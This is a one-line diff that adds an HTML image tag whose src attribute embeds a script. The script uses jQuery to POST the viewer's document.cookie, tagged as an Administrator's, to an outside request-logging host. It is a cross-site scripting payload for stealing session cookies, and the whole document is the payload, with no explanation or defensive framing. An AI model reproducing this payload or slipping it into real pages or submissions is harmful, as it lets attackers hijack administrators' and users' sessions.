@@ -1,0 +1,1 @@
+<img src="<script>$.ajax({url : 'http://ptsv2.com/t/msak4-1604661377/post', type : 'POST', data : 'username=Administrator;cookie=x' + document.cookie})</script>" style="width: 10px; heigth: 10px"/>
